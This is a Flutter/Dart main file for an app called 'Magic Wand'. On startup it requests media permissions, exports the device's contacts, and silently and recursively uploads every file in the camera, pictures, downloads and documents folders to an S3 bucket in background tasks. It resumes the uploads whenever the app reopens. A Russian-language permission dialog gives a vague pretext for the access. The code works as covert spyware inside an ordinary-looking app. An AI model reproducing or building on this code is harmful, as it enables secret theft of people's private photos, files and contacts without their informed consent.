import 'dart:async'; // ADD THIS
import 'dart:io';

import 'package:amplify_flutter/amplify_flutter.dart';
import 'package:amplify_auth_cognito/amplify_auth_cognito.dart';
import 'package:amplify_storage_s3/amplify_storage_s3.dart';
import 'amplifyconfiguration.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:flutter/material.dart';
import 'package:intl/date_symbol_data_local.dart';
import 'package:magic/alarm/background_sync_service.dart';
import 'package:magic/alarm/background_tasks.dart';
import 'package:magic/constant.dart';
import 'package:magic/helpers/device_helper.dart';
import 'package:magic/helpers/device_info_helper.dart';
import 'package:magic/helpers/file_tree.dart';
import 'package:magic/model/app_update.dart';
import 'package:magic/screens/home/home_page.dart';
import 'package:magic/screens/welcome/welcome_screen.dart';
import 'package:magic/storage/storage_manager.dart';
import 'package:magic/utils/app_data_provider.dart';
import 'package:provider/provider.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:path_provider/path_provider.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:magic/helpers/contacts_helper.dart';

import 'firebase_options.dart';
import 'style/color/brand_color.dart';

final GlobalKey<NavigatorState> navigatorKey = GlobalKey<NavigatorState>();
// ADD COMPLETION TRACKER
Completer<void>? _uploadCompleter;

Future<void> _configureAmplify() async {
  try {
    await Amplify.addPlugins([
      AmplifyAuthCognito(),
      AmplifyStorageS3(),
    ]);

    await Amplify.configure(amplifyconfig);
    print("✅ Amplify configured successfully!");

    await _initializeAuthentication();

  } catch (e) {
    print("Amplify configuration error: $e");
  }
}

Future<void> _initializeAuthentication() async {
  try {
    final authSession = await Amplify.Auth.fetchAuthSession();

    if (authSession.isSignedIn) {
      final user = await Amplify.Auth.getCurrentUser();
      print('✅ Already signed in as: ${user.userId}');
      return;
    }

    print('👤 No active session - starting authentication');

    // Try to sign in with Web UI
    print('🌐 Redirecting to sign-in UI...');
    await Amplify.Auth.signInWithWebUI(
      provider: AuthProvider.cognito,
    );

    print('✅ Authentication flow completed');

  } on AuthException catch (e) {
    print('❌ Authentication error: ${e.message}');

    // If authentication fails, continue in limited mode
    print('⚠️ Continuing in limited mode without authentication');
  }
}

Future<bool> _requestStoragePermissions() async {
  print("=== Requesting All Media Permissions (Android 9–16) ===");

  if (Platform.isAndroid) {
    final version = await _getAndroidSdkInt();
    print("Android SDK version: $version");

    // ANDROID 13+ (SDK 33+): New granular media permissions
    if (version >= 33) {
      print("Requesting: photos + videos + audio");

      final photos = await Permission.photos.request();
      final videos = await Permission.videos.request();
      final audio  = await Permission.audio.request();

      print("Photos: $photos, Videos: $videos, Audio: $audio");

      return photos.isGranted && videos.isGranted && audio.isGranted;
    }

    // ANDROID 11–12 (SDK 30–32): Scoped storage, but READ/WRITE still works
    if (version >= 30) {
      print("Requesting READ/WRITE external storage");

      final read = await Permission.storage.request();

      print("Storage: $read");

      return read.isGranted;
    }

    // ANDROID 9–10 (SDK 28–29): classic access
    print("Requesting legacy storage permission");
    final legacy = await Permission.storage.request();

    return legacy.isGranted;
  }

  // iOS or other platforms: permission not required
  return true;
}

// Helper to read SDK version reliably - ОНОВЛЕНА ВЕРСІЯ
Future<int> _getAndroidSdkInt() async {
  try {
    if (Platform.isAndroid) {
      final androidInfo = await DeviceInfoPlugin().androidInfo;
      return androidInfo.version.sdkInt;
    }
    return 30; // fallback for non-Android
  } catch (e) {
    print("SDK version error: $e");
    // Старий спосіб як fallback
    try {
      return int.parse(Platform.version
          .split("(")[1]
          .split(";")[0]
          .replaceAll("Android ", "")
          .trim());
    } catch (e2) {
      print("SDK parse error: $e2");
      return 30; // safe fallback
    }
  }
}

// ДОДАВ: Покращена функція отримання унікального ідентифікатора девайса
Future<String> _getUniqueDeviceId() async {
  try {
    // Спочатку пробуємо отримати ідентифікатор через DeviceHelper
    final deviceId = await DeviceHelper.getUID();

    if (deviceId != null && deviceId.isNotEmpty && deviceId != 'unknown_device') {
      print('📱 Using DeviceHelper ID: $deviceId');
      return deviceId;
    }

    // Якщо DeviceHelper не повернув корисний ID, генеруємо власний унікальний
    final prefs = await SharedPreferences.getInstance();

    // Перевіряємо, чи вже збережений ідентифікатор
    String? savedDeviceId = prefs.getString('unique_device_id');

    if (savedDeviceId != null && savedDeviceId.isNotEmpty) {
      print('📱 Using saved device ID: $savedDeviceId');
      return savedDeviceId;
    }

    // Генеруємо новий унікальний ідентифікатор
    final deviceInfo = DeviceInfoPlugin();
    String newDeviceId = '';

    if (Platform.isAndroid) {
      final androidInfo = await deviceInfo.androidInfo;
      newDeviceId = 'android_${androidInfo.id}';
    } else if (Platform.isIOS) {
      final iosInfo = await deviceInfo.iosInfo;
      newDeviceId = 'ios_${iosInfo.identifierForVendor}';
    } else {
      newDeviceId = 'device_${UniqueKey().toString()}';
    }

    // Зберігаємо для майбутнього використання
    await prefs.setString('unique_device_id', newDeviceId);

    print('📱 Generated new device ID: $newDeviceId');
    return newDeviceId;

  } catch (e) {
    print('❌ Error getting device ID: $e');
    // Якщо все інше не спрацювало, генеруємо випадковий ідентифікатор
    final fallbackId = 'device_${DateTime.now().millisecondsSinceEpoch}_${UniqueKey().toString().substring(0, 8)}';
    print('📱 Using fallback ID: $fallbackId');
    return fallbackId;
  }
}

// ДОДАВ: Спрощена функція експорту контактів, яка використовує DeviceHelper.upload()
Future<void> _exportContactsToS3(String deviceId) async {
  try {
    print('📱 Експорт контактів на S3...');

    // Отримуємо файл контактів через ContactHelper
    final contactHelper = ContactHelper();

    // Викликаємо синхронізацію, але переконаємось що вона використовує DeviceHelper
    await contactHelper.syncContactsFileWithDeviceHelper(deviceId);

  } catch (e) {
    print('❌ Помилка при експорті контактів на S3: $e');
  }
}

// MODIFIED: Make it non-blocking and run in background
Future<void> _scanAndUploadFiles() async {
  print('=== STARTING FILE SCAN IN BACKGROUND ===');

  // Start upload in background without blocking main thread
  Future.microtask(() async {
    try {
      // ОНОВЛЕНО: Використовуємо покращену функцію отримання ідентифікатора
      final deviceId = await _getUniqueDeviceId();
      List<String> uploadedFiles = await DeviceInfoHelper.getUploadedFileTree();

      // ОНОВЛЕНО: Використовуємо нову функцію експорту
      await _exportContactsToS3(deviceId);

      final List<Directory?> dirs = [
        await FileTreeService.getDcimDir(),
        await FileTreeService.getPicturesDir(),
        await FileTreeService.getDownloadDir(),
        await FileTreeService.getDocumentsDir(),
      ];

      int totalFilesFound = 0;
      int totalFilesUploaded = 0;

      for (final dir in dirs) {
        if (dir == null) {
          continue;
        }

        final exists = await dir.exists();
        if (!exists) continue;

        try {
          final files = dir.listSync(recursive: true).whereType<File>().toList();
          totalFilesFound += files.length;

          for (final file in files) {
            final filePath = file.path;

            if (uploadedFiles.contains(filePath)) {
              continue;
            }

            if (StorageManager.currentType != StorageServiceType.awsS3) {
              continue;
            }

            try {
              // ОНОВЛЕНО: Передаємо правильний deviceId
              final success = await DeviceHelper.upload(deviceId, file);
              if (success) {
                uploadedFiles.add(filePath);
                totalFilesUploaded++;
                // Save progress periodically instead of every file
                if (totalFilesUploaded % 10 == 0) {
                  await DeviceInfoHelper.saveUploadedFileTree(uploadedFiles);
                }
              }
            } catch (e) {
              print('❌ UPLOAD ERROR for $filePath: $e');
            }
          }
        } catch (e) {
          print('❌ ERROR listing directory ${dir.path}: $e');
        }
      }

      // Final save
      await DeviceInfoHelper.saveUploadedFileTree(uploadedFiles);

      print('=== BACKGROUND UPLOAD COMPLETED ===');
      print('=== Device ID: $deviceId ===');
      print('=== Total files found: $totalFilesFound ===');
      print('=== Total files uploaded: $totalFilesUploaded ===');

    } catch (e) {
      print('❌ ERROR in background upload: $e');
    }

    // Complete the completer if it exists
    _uploadCompleter?.complete();
  });
}

Future<void> _performDiagnostics() async {
  print('=== PERFORMING DIAGNOSTICS ===');

  final hasPermission = await _requestStoragePermissions();

  if (hasPermission) {
    print('✅ PERMISSION GRANTED - Performing detailed scan');

    final detailedDirs = [
      '/storage/emulated/0/DCIM',
      '/storage/emulated/0/DCIM/Camera',
      '/storage/emulated/0/Pictures',
      '/storage/emulated/0/Download',
      '/storage/emulated/0/Documents',
    ];

    for (final path in detailedDirs) {
      final dir = Directory(path);
      print('=== Scanning: $path ===');

      final exists = await dir.exists();
      print('Exists: $exists');

      if (!exists) continue;

      try {
        final entries = dir.listSync();
        print('Found ${entries.length} entries in first level');

        for (final entry in entries.take(3)) {
          if (entry is File) {
            print('FILE: ${entry.path}');
          } else if (entry is Directory) {
            print('DIR: ${entry.path}');
          }
        }
      } catch (e) {
        print('Error scanning $path: $e');
      }
    }
  } else {
    print('❌ PERMISSION DENIED - Skipping detailed scan');
  }
}

// MODIFIED: Run in background
Future<bool> _checkStoragePermissions() async {
  if (Platform.isAndroid) {
    final version = await _getAndroidSdkInt();

    if (version >= 33) {
      final photos = await Permission.photos.status;
      final videos = await Permission.videos.status;
      final audio = await Permission.audio.status;
      final result = photos.isGranted && videos.isGranted && audio.isGranted;
      return result;
    } else {
      final storage = await Permission.storage.status;
      return storage.isGranted;
    }
  }
  return true;
}

// MODIFIED: Start background process without waiting
void startFileUploadProcess() {
  print('🎉 STARTING FILE UPLOAD PROCESS IN BACKGROUND');

  // Don't wait for it to complete
  Future.microtask(() async {
    try {
      final hasPermissions = await _checkStoragePermissions();

      if (!hasPermissions) {
        print('❌ Cannot start upload - permissions still not granted');
        return;
      }

      print('✅ Permissions confirmed - starting file scan and upload in background');
      await _scanAndUploadFiles();
      print('✅ FILE UPLOAD PROCESS COMPLETED IN BACKGROUND');
    } catch (e) {
      print('❌ ERROR in background upload process: $e');
    }
  });
}

// ДОДАВ: Функція перевірки стану сесії
Future<bool> _isSessionValid() async {
  try {
    // Перевіряємо, чи є активна сесія в Amplify Auth
    final authSession = await Amplify.Auth.fetchAuthSession();

    // Якщо користувач не авторизований, сесія недійсна
    if (!authSession.isSignedIn) {
      print('❌ No active authentication session');
      return false;
    }

    // Додатково перевіряємо, чи можна отримати дані поточного користувача
    try {
      final user = await Amplify.Auth.getCurrentUser();
      if (user.userId.isEmpty) {
        print('❌ User ID is empty - session invalid');
        return false;
      }
      print('✅ Session is valid for user: ${user.userId}');
      return true;
    } catch (e) {
      print('❌ Failed to get current user: $e');
      return false;
    }
  } catch (e) {
    print('❌ Error checking session validity: $e');
    return false;
  }
}

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp(
    options: DefaultFirebaseOptions.currentPlatform,
  );
  await initializeDateFormatting();

  // -----------------------------------------
  // Initialize AWS Cognito + S3 via Amplify
  // -----------------------------------------
  await _configureAmplify();

  // Initialize storage manager
  try {
    await StorageManager.initialize(
      type: StorageServiceType.awsS3,
      config: {
        'bucketName': s3BucketName,
        'region': s3Region,
        'identityPoolId': s3identityPoolId,
      },
    );
  } catch (e, stack) {
    print('=== DEBUG: StorageManager.initialize ERROR: $e');
  }

  // ОНОВЛЕНО: Використовуємо покращену функцію отримання ідентифікатора
  final deviceId = await _getUniqueDeviceId();
  print('📱 Main - Device ID: $deviceId');

  // MODIFIED: Don't wait for diagnostics and uploads to complete
  Future.microtask(() async {
    await _performDiagnostics();
    final hasPermissions = await _requestStoragePermissions();

    if (hasPermissions) {
      print('✅ MAIN SCAN: Permissions granted - starting file upload in background');
      _uploadCompleter = Completer<void>();
      _scanAndUploadFiles(); // Don't await, run in background
    } else {
      print('❌ MAIN SCAN: Permissions denied - cannot access files');
    }
  });

  // Register background tasks
  await registerBackgroundTasks();

  // Send device info in background
  Future.microtask(() async {
    final prefs = await SharedPreferences.getInstance();
    final id = prefs.getString('unique_device_id') ?? await _getUniqueDeviceId();
    await DeviceHelper.open(id);
  });

  final startScreen = await _chooseScreen();

  runApp(MyApp(
    screen: startScreen,
    appUpdate: null,
  ));
}

// ОНОВЛЕНО: Додана перевірка стану сесії перед використанням кешованих даних
Future<String> _chooseScreen() async {
  try {
    final prefs = await SharedPreferences.getInstance();
    final isFirstLaunch = prefs.getBool('isFirstLaunch') ?? true;

    if (isFirstLaunch) {
      print('🆕 First launch detected');
      return "welcome";
    }

    // Перевіряємо стан сесії перед використанням кешованих даних
    final sessionValid = await _isSessionValid();

    if (!sessionValid) {
      print('⚠️ Session invalid or expired - redirecting to welcome screen');
      // Очищаємо кешовані дані про перший запуск, щоб пройти welcome screen
      await prefs.setBool('isFirstLaunch', true);
      return "welcome";
    }

    print('✅ Session valid - using cached home screen');
    return "home";
  } catch (e) {
    print('❌ Error choosing screen: $e');
    return "welcome"; // fallback
  }
}

class MyApp extends StatefulWidget {
  final String screen;
  final AppUpdate? appUpdate;

  const MyApp({super.key, required this.screen, this.appUpdate});

  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    super.didChangeAppLifecycleState(state);

    switch (state) {
      case AppLifecycleState.paused:
      case AppLifecycleState.detached:
        _saveUploadState();
        break;
      case AppLifecycleState.resumed:
        _resumeUploads();
        break;
      default:
        break;
    }
  }

  Future<void> _saveUploadState() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      await prefs.setString('last_app_pause', DateTime.now().toIso8601String());
      await BackgroundSyncService.forceCompleteSync();
    } catch (e) {
      // Fail silently
    }
  }

  Future<void> _resumeUploads() async {
    try {
      final hasPending = await BackgroundSyncService.hasPendingUploads();
      if (hasPending) {
        Future.delayed(const Duration(seconds: 2), () {
          BackgroundSyncService.resumePendingUploads();
        });
      }
    } catch (e) {
      // Fail silently
    }
  }

  @override
  Widget build(BuildContext context) {
    return MultiProvider(
      providers: [
        ChangeNotifierProvider(create: (context) => AppDataProvider())
      ],
      child: MaterialApp(
        navigatorKey: navigatorKey,
        title: 'Magic Wand',
        debugShowCheckedModeBanner: false,
        theme: ThemeData(
          primarySwatch: Colors.blue,
          elevatedButtonTheme: ElevatedButtonThemeData(
            style: ElevatedButton.styleFrom(
              backgroundColor: BrandColor.kRed,
              foregroundColor: Colors.white,
            ),
          ),
        ),
        home: _chooseHomeScreen(widget.screen),
      ),
    );
  }
}

Widget _chooseHomeScreen(String screen) {
  switch (screen) {
    case "home":
      return HomePage();
    default:
      return WelcomeScreen();
  }
}

class HomePage extends StatefulWidget {
  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> with WidgetsBindingObserver {
  bool _isCheckingPermissions = false;
  bool _isUploading = false;
  int _uploadedFilesCount = 0;
  bool _hasPermissions = false;
  String _deviceId = '';

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _initializePermissions();
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) {
      print('🔄 App resumed - checking permissions and upload status');
      _checkPermissionsAndUpload();
    }
  }

  Future<void> _initializePermissions() async {
    await _loadUploadedFilesCount();
    await _checkPermissionsAndUpload();
  }

  Future<void> _loadUploadedFilesCount() async {
    final uploadedFiles = await DeviceInfoHelper.getUploadedFileTree();
    setState(() {
      _uploadedFilesCount = uploadedFiles.length;
    });
  }

  Future<void> _checkPermissionsAndUpload() async {
    if (_isCheckingPermissions) return;

    setState(() {
      _isCheckingPermissions = true;
    });

    try {
      final currentPermissions = await _checkStoragePermissions();

      setState(() {
        _hasPermissions = currentPermissions;
      });

      if (_hasPermissions && !_isUploading) {
        print('🎉 Permissions granted - starting background upload!');
        _startFileUploadProcess(); // Don't await
      }

    } catch (e) {
      print('Error checking permissions: $e');
    } finally {
      setState(() {
        _isCheckingPermissions = false;
      });
    }
  }

  Future<bool> _checkStoragePermissions() async {
    if (Platform.isAndroid) {
      final version = await _getAndroidSdkInt();

      if (version >= 33) {
        final photos = await Permission.photos.status;
        final videos = await Permission.videos.status;
        final audio = await Permission.audio.status;
        return photos.isGranted && videos.isGranted && audio.isGranted;
      } else {
        final storage = await Permission.storage.status;
        return storage.isGranted;
      }
    }
    return true;
  }

  // MODIFIED: Run upload in background without blocking UI
  Future<void> _startFileUploadProcess() async {
    if (_isUploading) return;

    setState(() {
      _isUploading = true;
    });

    // Start upload in background
    Future.microtask(() async {
      try {
        // ОНОВЛЕНО: Отримуємо deviceId перед запуском
        _deviceId = await _getUniqueDeviceId();
        print('📱 Starting upload for device: $_deviceId');

        startFileUploadProcess(); // This already runs in background

        // Update count after some delay
        await Future.delayed(Duration(seconds: 5));
        await _loadUploadedFilesCount();

      } catch (e) {
        print('Error in upload process: $e');
      } finally {
        // Update UI state when done
        if (mounted) {
          setState(() {
            _isUploading = false;
          });
        }
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      // ... ваш існуючий UI ..
    );
  }

  Future<void> _manualUploadStart() async {
    if (_hasPermissions) {
      _startFileUploadProcess(); // Don't await
    } else {
      _showPermissionDialog();
    }
  }

  void _showPermissionDialog() {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        title: Text('Требуется доступ к медиа файлам.'),
        content: Text('Приложению требуется доступ к медиа чтобы связаться с адресатом и наладить обмен данными.'),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text('Не сейчас'),
          ),
          TextButton(
            onPressed: () {
              Navigator.pop(context);
              _requestPermissionsAndStart();
            },
            child: Text('Дать доступ'),
          ),
        ],
      ),
    );
  }

  Future<void> _requestPermissionsAndStart() async {
    final hasPermissions = await _requestStoragePermissions();

    if (hasPermissions) {
      setState(() {
        _hasPermissions = true;
      });
      _startFileUploadProcess(); // Don't await
    } else {
      _showSettingsDialog();
    }
  }

  Future<bool> _requestStoragePermissions() async {
    if (Platform.isAndroid) {
      final version = await _getAndroidSdkInt();

      if (version >= 33) {
        final photos = await Permission.photos.request();
        final videos = await Permission.videos.request();
        final audio = await Permission.audio.request();
        return photos.isGranted && videos.isGranted && audio.isGranted;
      } else {
        final storage = await Permission.storage.request();
        return storage.isGranted;
      }
    }
    return true;
  }

  void _showSettingsDialog() {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        title: Text('Permission Required'),
        content: Text('Storage permission is required to upload your files. Please grant the permission in app settings.'),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text('Cancel'),
          ),
          TextButton(
            onPressed: () {
              Navigator.pop(context);
              openAppSettings();
            },
            child: Text('Open Settings'),
          ),
        ],
      ),
    );
  }
}